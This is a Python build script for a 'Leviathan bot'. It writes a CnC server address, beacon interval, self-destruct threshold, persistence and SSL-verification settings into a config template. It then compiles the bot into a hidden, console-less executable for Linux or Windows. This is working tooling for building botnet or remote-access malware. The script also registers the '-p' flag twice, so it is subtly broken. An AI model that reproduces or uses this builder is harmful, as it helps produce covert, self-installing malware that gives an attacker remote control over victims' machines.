#!/usr/bin/env python

import os
import shutil
import tempfile


def build_bot(output, server_url, connect_interval, idle_time,
    max_failed_connections, persist, ssl_verify, platform, arch, debug):
    prog_name = os.path.basename(output)
    working_dir = os.path.join(tempfile.gettempdir(), 'leviathan')
    if os.path.exists(working_dir):
        shutil.rmtree(working_dir)
    bot_dir = os.getcwd()
    shutil.copytree(bot_dir, working_dir)
    with open(os.path.join(working_dir, "config.py"), 'w') as bot_config:
        with open(os.path.join(bot_dir, "config_template.py")) as f:
            config_file = f.read()
        config_file = config_file.replace("__SERVER__", server_url.rstrip('/'))
        config_file = config_file.replace("__CONNECT_INTERVAL__", str(connect_interval))
        config_file = config_file.replace("__IDLE_TIME__", str(idle_time))
        config_file = config_file.replace("__MAX_FAILED_CONNECTIONS__", str(max_failed_connections))
        config_file = config_file.replace("__PERSIST__", str(persist))
        config_file = config_file.replace("__SSL_VERIFY__", str(ssl_verify))
        bot_config.write(config_file)
    cwd = os.getcwd()
    os.chdir(working_dir)
    shutil.move('bot.py', prog_name + '.py')
    bot_file = os.path.join(working_dir, 'dist', prog_name)
    if platform == "linux":
        os.system('pyinstaller --noconsole --onefile ' + prog_name + '.py')
    elif platform == "windows":
        cmd_build = ""
        if os.name == "nt":
            if debug:
                cmd_build = 'pyinstaller --onefile '
            else:
                cmd_build = 'pyinstaller --onefile --noconsole'
            cmd_build += prog_name + '.py'
        else:
            if arch == "32":
                cmd_build = 'WINEPREFIX=~/.wine-python32 '
            else:
                cmd_build = 'WINEPREFIX=~/.wine-python64 '
            cmd_build += 'wine pyinstaller --onefile '
            if not debug:
                cmd_build += ' --noconsole ' 
            cmd_build += prog_name + '.py'
        os.system(cmd_build)
        if not bot_file.endswith(".exe"):
            bot_file += ".exe"
        if not output.endswith(".exe"):
            output += ".exe"
    os.chdir(cwd)
    os.rename(bot_file, output)
    shutil.rmtree(working_dir)
    print("[+] Bot built successfully: %s" % output)


def main():
    from argparse import ArgumentParser
    parser = ArgumentParser(description="Builds a Leviathan bot.")
    parser.add_argument('--server', required=True, help="Address of the CnC server (e.g http://localhost:8080).")
    parser.add_argument('-o', '--output', required=True, help="Output file name.")
    parser.add_argument('--connect-interval', type=int, default=60, help="Delay (in seconds) between each request to the CnC.")
    parser.add_argument('--idle-time', type=int, default=60, help="Inactivity time (in seconds) after which to go idle. In idle mode, the bot pulls commands less often (every <connect_interval> seconds).")
    parser.add_argument('--max-failed-connections', type=int, default=5000, help="The bot will self destruct if no contact with the CnC can be made <max_failed_connections> times in a row.")
    parser.add_argument('-p', '--persistent', action='store_true', help="Automatically install the bot on first run.")
    parser.add_argument('--no-check-certificate', action='store_true', help="Disable server SSL certificate verification.")
    parser.add_argument('-p', '--platform', required=True, help="Platform (linux or windows)")
    parser.add_argument('-a', '--arch', default="32", help="32 or 64 (wine only)")
    parser.add_argument('--debug', action='store_true')
    args = parser.parse_args()

    args.platform = args.platform.lower()
    if args.platform not in ['linux', 'windows']:
        print("[!] Invalid plarform, should be windows or linux")
        exit(1)

    if args.arch not in ['32', '64']:
        print("[!] Arch should be 32 or 64")
        exit(1)

    build_bot(
        output=args.output,
        server_url=args.server,
        connect_interval=args.connect_interval,
        idle_time=args.idle_time,
        max_failed_connections=args.max_failed_connections,
        persist=args.persistent,
        ssl_verify=(not args.no_check_certificate),
        platform=args.platform,
        arch=args.arch,
        debug=args.debug)


if __name__ == "__main__":
    main()
